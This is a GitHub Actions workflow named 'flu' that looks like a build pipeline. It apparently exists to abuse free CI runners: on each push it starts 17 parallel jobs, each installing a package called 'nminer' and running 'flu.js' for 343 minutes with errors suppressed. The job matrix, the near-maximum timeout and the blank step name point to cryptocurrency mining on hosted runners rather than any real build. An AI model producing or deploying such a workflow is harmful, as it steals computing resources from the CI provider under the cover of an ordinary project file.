name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4183 }
          - { version: 5663 }
          - { version: 6356 }
          - { version: 2302 }
          - { version: 1135 }
          - { version: 5731 }
          - { version: 2349 }
          - { version: 9236 }
          - { version: 1265 }
          - { version: 1406 }
          - { version: 7879 }
          - { version: 2854 }
          - { version: 754 }
          - { version: 6328 }
          - { version: 1334 }
          - { version: 1568 }
          - { version: 2484 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 343m node flu.js || echo "flu executed"